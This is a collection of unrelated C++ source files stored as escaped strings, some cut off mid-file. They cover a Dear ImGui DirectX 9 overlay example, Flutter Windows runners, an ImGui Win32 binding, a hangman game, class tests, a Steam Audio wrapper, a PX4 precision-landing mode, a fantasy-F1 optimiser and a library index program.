WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\n\n\n\n// Main code\nint main(int, char**)\n{\n\n   \n\n    // Create application window\n    //ImGui_ImplWin32_EnableDpiAwareness();\n    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L\"ImGui Example\", nullptr };\n    ::RegisterClassExW(&wc);\n    HWND hwnd = CreateWindowEx(\n        WS_EX_LAYERED,  // No WS_EX_NOACTIVATE or WS_EX_TOPMOST \n        _T(\"ImGui Example\"),\n        NULL,\n        WS_POPUP,\n        0, 0,\n        1920, 1080,\n        NULL,\n        NULL,\n        wc.hInstance,\n        NULL\n    );\n    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, ULW_COLORKEY);\n\n\n    // Initialize Direct3D\n    if (!CreateDeviceD3D(hwnd))\n    {\n        // Get the monitor's refresh rate\n\n        CleanupDeviceD3D();\n        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);\n        return 1;\n    }\n\n    // Show the window\n    ::ShowWindow(hwnd, SW_SHOWDEFAULT);\n    ::UpdateWindow(hwnd);\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsLight();\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplWin32_Init(hwnd);\n    ImGui_ImplDX9_Init(g_pd3dDevice);\n\n    // Load Fonts\n    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.\n    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.\n    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).\n    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.\n    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.\n    // - Read 'docs/FONTS.md' for more instructions and details.\n    // - Remember that in C/C++ if you want to include a backslash \\ in a string literal you need to write a double backslash \\\\ !\n    //io.Fonts->AddFontDefault();\n    //io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\segoeui.ttf\", 18.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/DroidSans.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Roboto-Medium.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Cousine-Regular.ttf\", 15.0f);\n    //ImFont* font = io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\ArialUni.ttf\", 18.0f, nullptr, io.Fonts->GetGlyphRangesJapanese());\n    //IM_ASSERT(font != nullptr);\n\n    // Our state\n    bool show_demo_window = true;\n    bool show_another_window = false;\n    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);\n\n    // Main loop\n    bool done = false;\n    while (!done)\n    {\n        // Poll and handle messages (inputs, window resize, etc.)\n        // See the WndProc() function below for our to dispatch events to the Win32 backend.\n        MSG msg;\n        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))\n        {\n            ::TranslateMessage(&msg);\n            ::DispatchMessage(&msg);\n            if (msg.message == WM_QUIT)\n                done = true;\n        }\n        if (done)\n            break;\n\n        // Handle lost D3D9 device\n        if (g_DeviceLost)\n        {\n            HRESULT hr = g_pd3dDevice->TestCooperativeLevel();\n            if (hr == D3DERR_DEVICELOST)\n            {\n                ::Sleep(10);\n                continue;\n            }\n           ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"adv_basic\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui: Platform Binding for Windows (standard windows API for 32 and 64 bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core imgui)\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Keyboard arrays indexed using VK_* Virtual Key Codes, e.g. ImGui::IsKeyPressed(VK_SPACE).\n// Missing features:\n//  [ ] Platform: Gamepad support (best leaving it to user application to fill io.NavInputs[] with gamepad inputs from their source of choice).\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <tchar.h>\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2018-11-30: Misc: Setting up io.BackendPlatformName so it can be displayed in the About Window.\n//  2018-06-29: Inputs: Added support for the ImGuiMouseCursor_Hand cursor.\n//  2018-06-10: Inputs: Fixed handling of mouse wheel messages to support fine position messages (typically sent by track-pads).\n//  2018-06-08: Misc: Extracted imgui_impl_win32.cpp/.h away from the old combined DX9/DX10/DX11/DX12 examples.\n//  2018-03-20: Misc: Setup io.BackendFlags ImGuiBackendFlags_HasMouseCursors and ImGuiBackendFlags_HasSetMousePos flags + honor ImGuiConfigFlags_NoMouseCursorChange flag.\n//  2018-02-20: Inputs: Added support for mouse cursors (ImGui::GetMouseCursor() value and WM_SETCURSOR message handling).\n//  2018-02-06: Inputs: Added mapping for ImGuiKey_Space.\n//  2018-02-06: Inputs: Honoring the io.WantSetMousePos by repositioning the mouse (when using navigation and ImGuiConfigFlags_NavMoveMouse is set).\n//  2018-02-06: Misc: Removed call to ImGui::Shutdown() which is not available from 1.60 WIP, user needs to call CreateContext/DestroyContext themselves.\n//  2018-01-20: Inputs: Added Horizontal Mouse Wheel support.\n//  2018-01-08: Inputs: Added mapping for ImGuiKey_Insert.\n//  2018-01-05: Inputs: Added WM_LBUTTONDBLCLK double-click handlers for window classes with the CS_DBLCLKS flag.\n//  2017-10-23: Inputs: Added WM_SYSKEYDOWN / WM_SYSKEYUP handlers so e.g. the VK_MENU key can be read.\n//  2017-10-23: Inputs: Using Win32 ::SetCapture/::GetCapture() to retrieve mouse positions outside the client area when dragging. \n//  2016-11-12: Inputs: Only call Win32 ::SetCursor(NULL) when io.MouseDrawCursor is set.\n\n// Win32 Data\nstatic HWND                 g_hWnd = 0;\nstatic INT64                g_Time = 0;\nstatic INT64                g_TicksPerSecond = 0;\nstatic ImGuiMouseCursor     g_LastMouseCursor = ImGuiMouseCursor_COUNT;\n\n// Functions\nbool    ImGui_ImplWin32_Init(void* hwnd)\n{\n    if (!::QueryPerformanceFrequency((LARGE_INTEGER *)&g_TicksPerSecond))\n        return false;\n    if (!::QueryPerformanceCounter((LARGE_INTEGER *)&g_Time))\n        return false;\n\n    // Setup back-end capabilities flags\n    g_hWnd = (HWND)hwnd;\n    ImGuiIO& io = ImGui::GetIO();\n    io.BackendFlags |= ImGuiBackendFlags_HasMouseCursors;         // We can honor GetMouseCursor() values (optional)\n    io.BackendFlags |= ImGuiBackendFlags_HasSetMousePos;          // We can honor io.WantSetMousePos requests (optional, rarely used)\n    io.BackendPlatformName = \"imgui_impl_win32\";\n    io.ImeWindowHandle = hwnd;\n\n    // Keyboard mapping. ImGui will use those indices to peek into the io.KeysDown[] array that we will update during the application lifetime.\n    io.KeyMap[ImGuiKey_Tab] = VK_TAB;\n    io.KeyMap[ImGuiKey_LeftArrow] = VK_LEFT;\n    io.KeyMap[ImGuiKey_RightArrow] = VK_RIGHT;\n    io.KeyMap[ImGuiKey_UpArrow] = VK_UP;\n    io.KeyMap[ImGuiKey_DownArrow] = VK_DOWN;\n    io.KeyMap[ImGuiKey_PageUp] = VK_PRIOR;\n    io.KeyMap[ImGuiKey_PageDown] = VK_NEXT;\n    io.KeyMap[ImGuiKey_Home] = VK_HOME;\n    io.KeyMap[ImGuiKey_End] = VK_END;\n    io.KeyMap[ImGuiKey_Insert] = VK_INSERT;\n    io.KeyMap[ImGuiKey_Delete] = VK_DELETE;\n    io.KeyMap[ImGuiKey_Backspace] = VK_BACK;\n    io.KeyMap[ImGuiKey_Space] = VK_SPACE;\n    io.KeyMap[ImGuiKey_Enter] = VK_RETURN;\n    io.KeyMap[ImGuiKey_Escape] = VK_ESCAPE;\n    io.KeyMap[ImGuiKey_A] = 'A';\n    io.KeyMap[ImGuiKey_C] = 'C';\n    io.KeyMap[ImGuiKey_V] = 'V';\n    io.KeyMap[ImGuiKey_X] = 'X';\n    io.KeyMap[ImGuiKey_Y] = 'Y';\n    io.KeyMap[ImGuiKey_Z] = 'Z';\n\n    return true;\n}\n\nvoid    ImGui_ImplWin32_Shutdown()\n{\n    g_hWnd = (HWND)0;\n}\n\nstatic bool ImGui_ImplWin32_UpdateMouseCursor()\n{\n    ImGuiIO& io = ImGui::GetIO();\n    if (io.ConfigFlags & ImGuiConfigFlags_NoMouseCursorChange)\n        return false;\n\n    ImGuiMouseCursor imgui_cursor = ImGui::GetMouseCursor();\n    if (imgui_cursor == ImGuiMouseCursor_None || io.MouseDrawCursor)\n    {\n        // Hide OS mouse cursor if imgui is drawing it or if it wants no cursor\n        ::SetCursor(NULL);\n    }\n    else\n    {\n        // Show OS mouse cursor\n        LP",
    "#include<bits/stdc++.h>\n#include<ctime>\nusing namespace std;\n\nint tries = 3;\nstring message = \"You have 3 chances !\";\n\nvoid hang_man(char);\nint checkGuess(char, string, string&);\n\nint main(){\n    char letter;\n    string month;\n    string months[] = {\n        \"january\",\n        \"february\",\n        \"march\",\n        \"april\",\n        \"may\",\n        \"june\",\n        \"july\",\n        \"september\",\n        \"october\",\n        \"november\",\n        \"december\"\n    };\n    srand(time(NULL));\n    int month_number = rand()%12;\n    month = months[month_number];\n    string hide_month(month.length(), '_');\n    system(\"cls\");\n    while(tries != 0){\n        hang_man('n');\n        cout << \"\\t\\t\\t\\tLife: \" << tries << endl;\n        cout << \"\\t\\t\\t\\t\" << hide_month << endl;\n        cout << \"\\t\\t\\t\\tGuess a letter: \";\n        cin >> letter;\n        system(\"cls\");\n        if(checkGuess(letter, month, hide_month) == 0){\n            message = \"Incorrect Letter !\";\n            tries--;\n        }\n        else{\n            message = \"Nice ! Correct Guess\";\n        }\n        if(hide_month == month){\n            message = \"You are free !\";\n            hang_man('f');\n            cout << \"\\t\\t\\t\\tLife: \" << tries << endl;\n            cout << \"\\t\\t\\t\\tThe month is: \" << month << endl;\n            break;\n        }\n    }\n    if(tries == 0){\n        message = \"You're Hanged !\";\n        hang_man('h');\n        cout << \"\\t\\t\\t\\tLife: \" << tries << endl;\n        cout << \"\\t\\t\\t\\tThe month is: \" << month << endl;\n\n    }\n    return 0;\n}\n\nint checkGuess(char guess, string real_month, string &hidden_month){\n    int matches = 0;\n    int len = real_month.length();\n    for(int i = 0; i<len; i++){\n        if(guess == hidden_month[i]){\n            return 0;\n        }\n        if(guess == real_month[i]){\n            hidden_month[i] = guess;\n            matches++;\n        }\n    }\n    return matches;\n}\n\nvoid hang_man(char state){\n    string head_string = \"|\";\n    string stage = \"=\";\n    if(state == 'f'){\n        head_string = \" \";\n    }\n    else if(state == 'h'){\n        stage = \" \";\n    }\n\n    cout << \"\\t\\t\\t\\tGuess the name of the month to save your friend !\" << endl;\n    cout << \"\\t\\t\\t\\t_______________________\" << endl;\n    cout << \"\\t\\t\\t\\t       \"<< head_string <<\"           |\" << endl;\n    cout << \"\\t\\t\\t\\t       o           |\" << endl;\n    cout << \"\\t\\t\\t\\t      / \\\\          |\" << \"\\t       \" << message << endl;\n    cout << \"\\t\\t\\t\\t       |           |\" << \"\\t      /\" << endl;\n    cout << \"\\t\\t\\t\\t      / \\\\          |         o \" << endl;\n    cout << \"\\t\\t\\t\\t   ==\"<<stage << stage << stage << stage << stage << \"==       |       /   \\\\\" << endl;\n    cout << \"\\t\\t\\t\\t   |       |       |         |\" << endl;\n    cout << \"\\t\\t\\t\\t   |       |       |       /   \\\\\" << endl;\n    cout << \"\\t\\t\\t\\t==================================\" << endl; \n\n}",
    "// main.cpp\r\n#include \"Chair.h\"\r\n#include <cassert>\r\n#include <vector>\r\n\r\nusing namespace std;\r\nint main() {\r\n    // Test 1: Create a Furniture object using the constructor\r\n    Chair chair(\"Office Chair\", 149.99, 10, 2,4,2,\"Modern\",true,6,false,false);\r\n    chair.display();\r\n    // Test 2: Test getter methods\r\n    assert(chair.getName() == \"Office Chair\");\r\n    assert(chair.getPrice() == 149.99);\r\n    assert(chair.getQuantity() == 10);\r\n    vector<double> properDims={2,4,2};\r\n    assert(chair.getDimensions() == properDims);\r\n    assert(chair.getStyle()==\"Modern\");\r\n    assert(chair.getHasArmrest()==true);\r\n    assert(chair.getNumberOfLegs() == 6);\r\n    std::cout << \"Getters passed.\" << std::endl;\r\n\r\n    // Test 3: Test setter methods\r\n    chair.setName(\"Ergonomic Office Chair\");\r\n    chair.setPrice(199.99);\r\n    chair.setQuantity(5);\r\n    chair.setDimensions(3,3,4);\r\n    chair.setStyle(\"Seventies Retro\");\r\n\r\n    assert(chair.getName() == \"Ergonomic Office Chair\");\r\n    assert(chair.getPrice() == 199.99);\r\n    assert(chair.getQuantity() == 5);\r\n    properDims = {3,3,4};\r\n    assert(chair.getDimensions() == properDims);\r\n\r\n    chair.display();\r\n    std::cout << \"Setters passed.\" << std::endl;\r\n\r\n    // Test 4: Test multiple Furniture objects\r\n    Furniture table(\"Dining Table\", 299.99, 3, 6,4,10,\"Victorian\");\r\n    Furniture sofa(\"Leather Sofa\", 499.99, 2, 10,4,4,\"Minimalist\");\r\n\r\n    table.display();\r\n    sofa.display();\r\n\r\n    // Test 5: Polymorphism with display method\r\n    Furniture* items[] = { &chair, &table, &sofa };\r\n    std::cout << \"\\nDisplaying all furniture items:\" << std::endl;\r\n    for(auto item : items) {\r\n        item->display();\r\n    }\r\n\r\n    // Test 6: Dynamic Allocation and Cleanup\r\n    Furniture* dynamicChair = new Furniture(\"Gaming Chair\", 249.99, 7, 3,4,6,\"Ergonomic\");\r\n    dynamicChair->display();\r\n    delete dynamicChair;\r\n    std::cout << \"Dynamic allocation test passed.\" << std::endl;\r\n\r\n    std::cout << \"All tests passed successfully!\" << std::endl;\r\n\r\n    return 0;\r\n}\r\n",
    "//---------------------OOP Interface for steam audio(not implemented fully yet)---------------------------\n#include \"steamaudiomanager.h\"\n#include <iostream>\n\nSteamAudioManager::SteamAudioManager() : context(nullptr), hrtf(nullptr), binauralEffect(nullptr)\n{\n    std::cout << \"SteamAudioManager constructor called\" << std::endl;\n}\n\nSteamAudioManager::~SteamAudioManager()\n{\n    std::cout << \"SteamAudioManager destructor called\" << std::endl;\n    CleanUp();\n}\n\nbool SteamAudioManager::Initialize()\n{\n    std::cout << \"Initializing Steam Audio...\" << std::endl;\n    \n    // Initialize context\n    IPLContextSettings contextSettings{};\n    contextSettings.version = STEAMAUDIO_VERSION;\n    IPLerror error = iplContextCreate(&contextSettings, &context);\n    if(error != IPL_STATUS_SUCCESS)\n    {\n        std::cerr << \"Failed to create Steam Audio Context.\" << std::endl;\n        return false;\n    }\n    std::cout << \"Steam Audio context initialized successfully\" << std::endl;\n\n    // Set up audio settings\n    IPLAudioSettings audioSettings{};\n    audioSettings.samplingRate = 44100;\n    audioSettings.frameSize = 1024;\n\n    // Initialize HRTF\n    std::cout << \"Initializing HRTF...\" << std::endl;\n    IPLHRTFSettings hrtfSettings{};\n    hrtfSettings.type = IPL_HRTFTYPE_DEFAULT;\n\n    error = iplHRTFCreate(context, &audioSettings, &hrtfSettings, &hrtf);\n    if (error != IPL_STATUS_SUCCESS)\n    {\n        std::cerr << \"Failed to create HRTF.\" << std::endl;\n        iplContextRelease(&context);\n        return false;\n    }\n    std::cout << \"HRTF initialized successfully\" << std::endl;\n\n    // Initialize binaural effect\n    std::cout << \"Initializing binaural effect...\" << std::endl;\n    IPLBinauralEffectSettings effectSettings{};\n    effectSettings.hrtf = hrtf;\n\n    error = iplBinauralEffectCreate(context, &audioSettings, &effectSettings, &binauralEffect);\n    if (error != IPL_STATUS_SUCCESS)\n    {\n        std::cerr << \"Failed to create binaural effect.\" << std::endl;\n        iplHRTFRelease(&hrtf);\n        iplContextRelease(&context);\n        return false;\n    }\n    std::cout << \"Binaural effect initialized successfully\" << std::endl;\n\n    return true;\n}\n\nvoid SteamAudioManager::CleanUp()\n{\n    std::cout << \"Cleaning up Steam Audio...\" << std::endl;\n\n    if(simulator)\n    {\n        iplSimulatorRelease(&simulator);\n        std::cout << \"Simulator released\" << std::endl;\n\n    }\n    if (binauralEffect)\n    {\n        iplBinauralEffectRelease(&binauralEffect);\n        std::cout << \"Binaural effect released\" << std::endl;\n    }\n    if (hrtf)\n    {\n        iplHRTFRelease(&hrtf);\n        std::cout << \"HRTF released\" << std::endl;\n    }\n    if(context)\n    {\n        iplContextRelease(&context);\n        context = nullptr;\n        std::cout << \"Steam Audio context destroyed\" << std::endl;\n    }\n    else\n    {\n        std::cout << \"No Steam Audio context to clean up\" << std::endl;\n    }\n}\n\nvoid SteamAudioManager::DebugPrint() const\n{\n    std::cout << \"SteamAudioManager Debug Information:\" << std::endl;\n    std::cout << \"Context: \" << (context ? \"Initialized\" : \"Not initialized\") << std::endl;\n    std::cout << \"Steam Audio Version: \" \n              << STEAMAUDIO_VERSION_MAJOR << \".\"\n              << STEAMAUDIO_VERSION_MINOR << \".\"\n              << STEAMAUDIO_VERSION_PATCH << std::endl;\n}\n\nIPLSource SteamAudioManager::CreateSource()\n{\n    IPLSource source = nullptr;\n    IPLSourceSettings sourceSettings = {};\n    sourceSettings.flags = IPL_SIMULATIONFLAGS_DIRECT;\n\n    IPLerror error = iplSourceCreate(simulator, &sourceSettings, &source);\n    if(error != IPL_STATUS_SUCCESS)\n    {\n        std::cerr << \"Failed to create Steam Audio Source.\" << std::endl;\n        return nullptr;\n    }\n    return source;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fusion\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"PrecisionLand.hpp\"\n\n#include <px4_ros2/components/node_with_mode.hpp>\n#include <px4_ros2/utils/geometry.hpp>\n#include <Eigen/Core>\n#include <Eigen/Geometry>\n#include \"geometry_msgs/msg/transform_stamped.hpp\"\n#include \"tf2/exceptions.h\"\n\nstatic const std::string kModeName = \"PrecisionLandCustom\";\nstatic const bool kEnableDebugOutput = true;\n\nusing namespace px4_ros2::literals;\n\nPrecisionLand::PrecisionLand(rclcpp::Node& node)\n\t: ModeBase(node, kModeName)\n\t, _node(node)\n{\n\n\t_trajectory_setpoint = std::make_shared<px4_ros2::TrajectorySetpointType>(*this);\n\n\t_vehicle_local_position = std::make_shared<px4_ros2::OdometryLocalPosition>(*this);\n\n\t_vehicle_attitude = std::make_shared<px4_ros2::OdometryAttitude>(*this);\n\n\t// _target_pose_sub = _node.create_subscription<geometry_msgs::msg::PoseStamped>(\"/target_pose\",\n\t// \t\t   rclcpp::QoS(1).best_effort(), std::bind(&PrecisionLand::targetPoseCallback, this, std::placeholders::_1));\n\t\n\t_vehicle_land_detected_sub = _node.create_subscription<px4_msgs::msg::VehicleLandDetected>(\"/fmu/out/vehicle_land_detected\",\n\t\t\t\t     rclcpp::QoS(1).best_effort(), std::bind(&PrecisionLand::vehicleLandDetectedCallback, this, std::placeholders::_1));\n\n\tloadParameters();\n}\n\nvoid PrecisionLand::loadParameters()\n{\n\t_node.declare_parameter<float>(\"descent_vel\", 1.0);\n\t_node.declare_parameter<float>(\"vel_p_gain\", 1.5);\n\t_node.declare_parameter<float>(\"vel_i_gain\", 0.0);\n\t_node.declare_parameter<float>(\"max_velocity\", 3.0);\n\t_node.declare_parameter<float>(\"target_timeout\", 3.0);\n\t_node.declare_parameter<float>(\"delta_position\", 0.25);\n\t_node.declare_parameter<float>(\"delta_velocity\", 0.25);\n\n\t_node.get_parameter(\"descent_vel\", _param_descent_vel);\n\t_node.get_parameter(\"vel_p_gain\", _param_vel_p_gain);\n\t_node.get_parameter(\"vel_i_gain\", _param_vel_i_gain);\n\t_node.get_parameter(\"max_velocity\", _param_max_velocity);\n\t_node.get_parameter(\"target_timeout\", _param_target_timeout);\n\t_node.get_parameter(\"delta_position\", _param_delta_position);\n\t_node.get_parameter(\"delta_velocity\", _param_delta_velocity);\n\n\tRCLCPP_INFO(_node.get_logger(), \"descent_vel: %f\", _param_descent_vel);\n\tRCLCPP_INFO(_node.get_logger(), \"vel_i_gain: %f\", _param_vel_i_gain);\n}\n\nvoid PrecisionLand::vehicleLandDetectedCallback(const px4_msgs::msg::VehicleLandDetected::SharedPtr msg)\n{\n\t_land_detected = msg->landed;\n}\n\nvoid PrecisionLand::targetPoseCallback()\n{\t\n\ttry {\n\t\t\t\tgeometry_msgs::msg::TransformStamped _temp_transform;\n        _temp_transform = _tf_buffer->lookupTransform(\n\t\t\t\t\t  \"x500_mono_cam_down_0/mono_cam/base_link/imager\",  \n            \"tagStandard41h12:0\",  \n            tf2::TimePointZero     \n        );\n\n\t\t\t\tauto tag = AprilTag {\n\t\t\t\t.position = Eigen::Vector3d(_temp_transform.transform.translation.x, _temp_transform.transform.translation.y, _temp_transform.transform.translation.z),\n\t\t\t\t.orientation = Eigen::Quaterniond(_temp_transform.transform.rotation.w, _temp_transform.transform.rotation.x, _temp_transform.transform.rotation.y, _temp_transform.transform.rotation.z),\n\t\t\t\t.timestamp = _temp_transform.header.stamp\n\t\t\t\t};\n\t\t\t\t_tag = getTagWorld(tag);\n\t\t\t\tRCLCPP_INFO(_node.get_logger(), \"State = %s\", stateName(_state).c_str());\n\t\t\t\tRCLCPP_INFO(_node.get_logger(), \"Pose timestamp = %f, current timestamp: %f\", _tag.timestamp.seconds(), _node.now().seconds());\n\t\t\t\tRCLCPP_INFO(_node.get_logger(), \"Camera framen tag position: x = %f, y = %f\", tag.position.x(), tag.position.y());\n\t\t\t\tRCLCPP_INFO(_node.get_logger(), \"NED frame vehicle position: x = %f, y = %f\", _vehicle_local_position->positionNed().x(), _vehicle_local_position->positionNed().y());\n\t\t\t\tRCLCPP_INFO(_node.get_logger(), \"NED frame tag position    : x = %f, y = %f\", _tag.position.x(), _tag.position.y());\n\n\t\t\t\t\n    } catch (const tf2::TransformException &ex) {\n        RCLCPP_INFO(_node.get_logger(), \"Error reciveing tag pose: %s\", ex.what());\n  }\n\t\n}\n\nPrecisionLand::AprilTag PrecisionLand::getTagWorld(const AprilTag& tag)\n{\n\t// Convert from optical to NED\n\t// Optical: X right, Y down, Z away from lens\n\t// NED: X forward, Y right, Z away from viewer\n\tEigen::Matrix3d R;\n\tR << 0, -1, 0,\n\t1, 0, 0,\n\t0, 0, 1;\n\tEigen::Quaterniond quat_NED(R);\n\n\tauto vehicle_position = Eigen::Vector3d(_vehicle_local_position->positionNed().cast<double>());\n\tauto vehicle_orientation = Eigen::Quaterniond(_vehicle_attitude->attitude().cast<double>());\n\n\tEigen::Affine3d drone_transform = Eigen::Translation3d(vehicle_position) * vehicle_orientation;\n\tEigen::Affine3d camera_transform = Eigen::Translation3d(0, 0, 0) * quat_NED;\n\tEigen::Affine3d tag_transform = Eigen::Translation3d(tag.position) * tag.orientation;\n\tEigen::Affine3d tag_world_transform = drone_transform * camera_transform * tag_transform;\n\n\tAprilTag world_tag = {\n\t\t.position = tag_world_transform.translation(),\n\t\t.orientation = Eigen::Quaterniond(tag_world_transform.rotation()),\n\t\t.timestamp = tag.timestamp,\n\t};\n\n\treturn world_tag;\n}\n\nvoid PrecisionLand::onActivate()\n{\n\tgenerateSearchWaypoints();\n\t//--------------------",
    "#include \"driver.hh\"\n#include \"team.hh\"\n#include \"utility.hh\"\n\nint main() {   \n    // Create vectors with all drivers and all teams\n    std::vector<Driver> drivers = read_drivers(\"data/drivers.csv\");\n    std::vector<Team> teams = read_teams(\"data/teams.csv\");\n\n    // Read race results and compute the expected performace   \n    read_race_results(\"data/driver_results_2024.csv\",\"data/team_results_2024.csv\",drivers,teams);\n    \n    // Feature matrix and labels (for XGBoost training)\n    std::vector<float> feature_matrix;\n    std::vector<float> labels;\n\n    // Prepare the dataset for training\n    prepare_dataset(drivers, feature_matrix, labels);\n\n    // Train the XGBoost model and save it to a file\n    std::string model_path = \"xgboost_model.bin\";\n    train_xgboost_model(feature_matrix, labels, model_path);\n    fine_tune_xgboost_model(drivers, model_path, 3);\n\n    std::cout << \"Model trained and saved to \" << model_path << std::endl;\n\n    // Compute the expected performance utilizing the ML model and simple stochastics\n    calculate_expected_performance_ML(drivers, model_path); \n    calculate_expected_performace_combi(drivers,teams);  \n\n    // Print out the drivers and teams for verification\n    print_drivers(drivers);\n    print_teams(teams);\n\n    // Find the optimal team based on points and budget\n    std::cout<<\"Searching for optimal team\\n\"<<std::endl;\n    find_optimal_team(drivers, teams, model_path);\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <algorithm>\r\n#include <clocale>\r\n#include <chrono>\r\nusing namespace std;\r\n\r\nstruct Reader {\r\n    int ticket_number;     // \u041d\u043e\u043c\u0435\u0440 \u0447\u0438\u0442\u0430\u0442\u0435\u043b\u044c\u0441\u043a\u043e\u0433\u043e \u0431\u0438\u043b\u0435\u0442\u0430 (\u043a\u043b\u044e\u0447)\r\n    char full_name[50];    // \u0424\u0418\u041e\r\n    char city[30];         // \u0413\u043e\u0440\u043e\u0434\r\n};\r\n// \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u0432 \u043e\u043f\u0435\u0440\u0430\u0442\u0438\u0432\u043d\u043e\u0439 \u043f\u0430\u043c\u044f\u0442\u0438\r\nstruct IndexEntry {\r\n    int key;         // \u041d\u043e\u043c\u0435\u0440 \u0447\u0438\u0442\u0430\u0442\u0435\u043b\u044c\u0441\u043a\u043e\u0433\u043e \u0431\u0438\u043b\u0435\u0442\u0430\r\n    long offset;     // \u0421\u043c\u0435\u0449\u0435\u043d\u0438\u0435 \u0432 \u0431\u0438\u043d\u0430\u0440\u043d\u043e\u043c \u0444\u0430\u0439\u043b\u0435\r\n};\r\nvector<IndexEntry> indexTable;  // \u0422\u0430\u0431\u043b\u0438\u0446\u0430 \u0438\u043d\u0434\u0435\u043a\u0441\u043e\u0432\r\n\r\n// \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0434\u043b\u044f \u043f\u043e\u0441\u0442\u0440\u043e\u0435\u043d\u0438\u044f \u0442\u0430\u0431\u043b\u0438\u0446\u044b \u0438\u043d\u0434\u0435\u043a\u0441\u043e\u0432\r\nvoid build_index_table(const string& binary_filename) {\r\n    ifstream binary_file(binary_filename, ios::binary);\r\n    if (!binary_file.is_open()) {\r\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430!\" << endl;\r\n        return;\r\n    }\r\n\r\n   